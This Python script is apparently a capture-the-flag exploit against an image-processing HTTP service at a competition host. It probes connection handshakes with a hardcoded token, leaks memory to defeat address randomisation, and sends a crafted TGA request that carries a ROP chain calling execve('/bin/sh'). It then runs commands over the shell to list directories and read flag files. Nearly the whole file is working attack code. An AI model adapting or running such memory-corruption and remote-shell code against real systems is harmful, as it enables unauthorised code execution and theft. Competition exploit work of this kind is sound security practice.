#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Wrapper-aware exploit that tries every handshake shape.

    python3 go.py [host] [port] [token]

Modes (each tried twice):
  one_crlf : token + "\\r\\n" + HTTP  in ONE sendall   <- worked remotely once
  one_nl   : token + "\\n"   + HTTP  in ONE sendall
  paced    : token, 0.7s pause, HTTP
  wait20   : wait 20s for a banner, then token, then HTTP
  plain    : HTTP only (no wrapper)

Each attempt is classified: reset / closed / open (silent) / answered.
"""
import socket, struct, sys, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "instances.ctfcup.online"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
TOKEN = sys.argv[3] if len(sys.argv) > 3 else "5CYH8BZ95GHQV3IYLDJS83X0HIXSSQTG"

W = H = 4
S = W * H * 3
BLEN = 18 + 1 + 384
LVT, LRET, PRDI, PRSI, PRAX, SYSC = 0x206db8, 0xcf7b1, 0x1cca4, 0x239af, 0x3b4aa, 0x155ed5
MODE = None


def tga_payload(n=16, color=b"\x11\x22\x33"):
    """RLE body for 4x4: one run chunk of n pixels."""
    return bytes([127 + n]) + color


def req(gamma, payload):
    d = struct.pack("<BBBHHBHHHHBB", 0, 0, 10, 0, 0, 0, 0, 0, W, H, 24, 0) + payload
    d += b"\x00" * (BLEN - len(d))
    d = d[:BLEN]
    head = ("POST /process HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\nX-Filter: warm\r\n"
            "X-Preview-Size: %d\r\nX-Preview-Offset: 0\r\nX-Preview-Length: 1024\r\n"
            "X-Preview-Depth: 2000000000\r\nX-Scale: 1\r\nX-Gamma: %s\r\n\r\n"
            % (BLEN, S, gamma))
    return head.encode() + d


def rd(s, wait):
    s.settimeout(wait)
    out = b""
    closed = False
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        except ConnectionResetError:
            return out, "reset"
        if not d:
            closed = True
            break
        out += d
    return out, ("closed" if closed else "open")


def run(reqbytes, mode, wait=8.0):
    """Perform one handshake + request.  Returns (pre, body, state)."""
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(8)
    pre = b""
    try:
        if mode == "one_crlf":
            s.sendall(TOKEN.encode() + b"\r\n" + reqbytes)
        elif mode == "one_nl":
            s.sendall(TOKEN.encode() + b"\n" + reqbytes)
        elif mode == "paced":
            s.sendall(TOKEN.encode() + b"\r\n")
            time.sleep(0.7)
            s.sendall(reqbytes)
        elif mode == "wait20":
            pre, st = rd(s, 20.0)
            if st == "reset":
                return pre, b"", "reset"
            s.sendall(TOKEN.encode() + b"\r\n")
            ack, st = rd(s, 3.0)
            pre += ack
            if st == "reset":
                return pre, b"", "reset"
            s.sendall(reqbytes)
        elif mode == "plain":
            s.sendall(reqbytes)
        body, st = rd(s, wait)
        return pre, body, st
    finally:
        try:
            s.close()
        except OSError:
            pass


def detect():
    global MODE
    benign = req("0", tga_payload())
    for mode in ("one_crlf", "one_nl", "paced", "wait20", "plain"):
        for rnd in range(2):
            try:
                pre, body, st = run(benign, mode, wait=8.0)
            except OSError as e:
                print("    %-8s r%d -> %-6s %s: %s"
                      % (mode, rnd, "error", type(e).__name__, e))
                time.sleep(1.0)
                continue
            blob = pre + body
            ok = b"HTTP/" in blob
            extra = "" if ok else ("  " + repr(blob[:70]) if blob else "")
            print("    %-8s r%d -> %-6s %5d B%s" % (mode, rnd, st, len(blob), extra))
            if ok:
                MODE = mode
                return True
            time.sleep(1.0)
    return False


def leak():
    _, body, st = run(req("0", tga_payload()), MODE, wait=10.0)
    i = body.find(b"HTTP/")
    if i < 0:
        raise SystemExit("no HTTP in leak reply (%s): %r" % (st, body[-200:]))
    _, _, d = body[i:].partition(b"\r\n\r\n")
    if len(d) < 0x100:
        raise SystemExit("short leak body (%s): %r" % (st, d[:120]))
    for o in range(0, len(d) - 0x20, 8):
        vt = struct.unpack_from("<Q", d, o)[0]
        if vt < 0x1000:
            continue
        pie = vt - LVT
        if pie % 0x1000 == 0 and 0x40000000 <= pie < 0x800000000000:
            view, temp = struct.unpack_from("<QQ", d, o + 8)
            if view and temp and 0 < temp - view < 0x1000:
                return pie, view, view + o, temp
    raise SystemExit("filter object not found: %s" % d[:64].hex())


def fire(payload):
    """Send the exploit request keeping the socket open for the shell."""
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(10)
    r = req("0", payload)
    if MODE == "one_crlf":
        s.sendall(TOKEN.encode() + b"\r\n" + r)
    elif MODE == "one_nl":
        s.sendall(TOKEN.encode() + b"\n" + r)
    elif MODE == "paced":
        s.sendall(TOKEN.encode() + b"\r\n")
        time.sleep(0.7)
        s.sendall(r)
    elif MODE == "wait20":
        rd(s, 20.0)
        s.sendall(TOKEN.encode() + b"\r\n")
        rd(s, 3.0)
        s.sendall(r)
    else:
        s.sendall(r)
    return s


def main():
    print("[*] %s:%d" % (HOST, PORT))
    print("[*] trying handshakes ...")
    if not detect():
        print("[!] the instance never answered.")
        print("    reset  -> port reachable, peer drops us (IP ban / bad endpoint)")
        print("    closed -> closed immediately (instance down or token rejected)")
        print("    open   -> stays connected, no bytes (instance not started / hung)")
        return 1
    print("[+] handshake:", MODE)
    pie, view, F, temp = leak()
    print("[+] pie=%#x view=%#x temp=%#x filter=%#x" % (pie, view, temp, F))
    dl = F - temp
    if not 0x40 <= dl <= 0x100:
        print("[!] unexpected layout delta=%#x" % dl)
        return 2

    b = bytearray(b"\x90" * 384)

    def put(o, v):
        struct.pack_into("<Q", b, o, v)

    put(dl, F + 0x100)
    put(dl + 8, pie + PRDI)
    put(dl + 0x10, F + 0x120)
    put(dl + 0x18, pie + PRSI)
    put(dl + 0x20, 0)
    put(dl + 0x28, pie + PRAX)
    put(dl + 0x30, 59)
    put(dl + 0x38, pie + SYSC)
    put(dl + 0x110, pie + LRET)
    b[dl + 0x120:dl + 0x128] = b"/bin/sh\x00"

    s = fire(bytes([127]) + bytes(b))
    print("[+] payload sent.")
    time.sleep(0.6)
    s.sendall(b"echo ---PWNED---; id; ls /; ls /app /home 2>/dev/null; "
              b"cat /flag /flag.txt /app/flag /app/flag.txt /home/*/flag* 2>/dev/null; "
              b"find / -maxdepth 4 -name 'flag*' 2>/dev/null | head\n")
    time.sleep(2.5)
    out, _ = rd(s, 4.0)
    s.close()
    txt = out.decode("latin1", "replace")
    print(txt)
    return 0 if "PWNED" in txt else 3


sys.exit(main())
